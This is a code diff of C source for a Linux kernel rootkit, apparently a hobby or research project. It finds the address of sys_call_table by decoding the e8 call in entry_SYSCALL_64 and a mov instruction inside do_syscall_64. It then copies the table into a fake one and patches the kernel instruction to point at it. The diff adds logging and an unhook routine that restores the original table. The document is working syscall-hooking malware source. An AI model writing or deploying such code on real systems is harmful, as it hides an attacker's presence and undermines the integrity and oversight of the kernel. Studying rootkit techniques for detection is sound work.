@@ -12,7 +12,8 @@
 // TODO: Document all the functions using Doxygen format.
 
 // Backup where we store the original sys_call_table.
-unsigned long *sys_call_table_backup;
+unsigned long *sys_call_table_backup = NULL;
+unsigned char *do_syscall_64_patch_addr = NULL;
 
 // Our fake sys_call_table.
 unsigned long fake_sct[__NR_syscall_max+1];
@@ -63,6 +64,8 @@ int __hook_syscall_table_64(void) {
         return -1;
     }
 
+    yarr_log("entry_SYSCALL_64 at 0x%px", entry_SYSCALL_64);
+
     // Look for the first e8 byte. This byte is the opcode for a
     // near/relative call instruction.
     //
@@ -78,11 +81,17 @@ int __hook_syscall_table_64(void) {
         return -1;
     }
 
+    yarr_log("addr_e8 at 0x%px", addr_e8);
+
     // Get the 4 bytes next to the call opcode (displacement).
     memcpy(&displacement, (void *)(addr_e8 + 1), 4);
 
+    yarr_log("displacement is 0x%x(%d)", displacement, displacement);
+
     // Calculate the address of do_syscall_64.
     do_syscall_64 = (void *)(addr_e8 + 5 + displacement);
+
+    yarr_log("do_syscall_64 is at 0x%px", do_syscall_64);
 
     // The function do_syscall_64 has the address of sys_call_table in one of
     // its instructions, specifically mov <num>(,%rdi,8),%rax. Here <num> is
@@ -95,6 +104,8 @@ int __hook_syscall_table_64(void) {
     // the assembler.
     addr_8b = lookup_byte(do_syscall_64, '\x8b', 2);
 
+    yarr_log("addr_8b is at 0x%px", addr_8b);
+
     // Get the 4 bytes we are interested in.
     memcpy(&sct_addr_encoded, (void *)(addr_8b + 3), 4);
 
@@ -103,16 +114,51 @@ int __hook_syscall_table_64(void) {
     // pointer so we omit a warning.
     sys_call_table_backup = (void *)(long)sct_addr_encoded;
 
+    yarr_log("sys_call_table is at 0x%px", sys_call_table_backup);
+
     // Fulfill our fake sys_call_table with the real syscalls.
     for (i = 0; i < __NR_syscall_max + 1; i++) {
         fake_sct[i] = sys_call_table_backup[i];
     }
 
+    yarr_log("Patching sys_call_table...");
     // Now we patch the instruction from where we got the sys_call_table
     // with our fake sys_call_table.
+    //
+    // TODO: This global should disappear when the patch subsystem is
+    // developed.
+    do_syscall_64_patch_addr = addr_8b + 3;
     err = __patch_sct((void *)(addr_8b + 3), fake_sct);
+    if (err) {
+        yarr_log("error patching the sys_call_table");
+        return -1;
+    }
 
-    return err;
+    yarr_log("Patched sys_call_table");
+
+    return 0;
+}
+
+int __unhook_syscall_table_64(void) {
+    int err;
+
+    if (sys_call_table_backup == NULL) {
+        yarr_log("sys_call_table_backup is NULL");
+        return -1;
+    }
+
+    // TODO: For now do a quick unpatch, but I should start thinking about the
+    // patch tracker system and start using it here. Also returning here
+    // doesn't seem like a good approach, try to unpatch/unhook/undo everything
+    // you did while loading the module, even if some steps fail try with the
+    // rest.
+    err = __patch_sct(do_syscall_64_patch_addr, sys_call_table_backup);
+    if (err) {
+        yarr_log("error unpatching do_syscall_64");
+        return -1;
+    }
+
+    return 0;
 }
 
 // TODO: For now I'm forcing the rootkit to work just on 64-bit kernels.
@@ -125,7 +171,21 @@ int hook_syscall_tables(void) {
         yarr_log("error hooking sys_call_table for 64-bit");
     }
 
-    // Hook the 32-bit system call table.
+    // TODO: Hook the 32-bit system call table.
+
+    return 0;
+}
+
+int unhook_syscall_tables(void) {
+    int err;
+
+    // Unhook the 64-bit system call table.
+    err = __unhook_syscall_table_64();
+    if (err) {
+        yarr_log("error unhooking sys_call_table for 64-bit");
+    }
+
+    // TODO: Unhook the 32-bit system call table.
 
     return 0;
 }
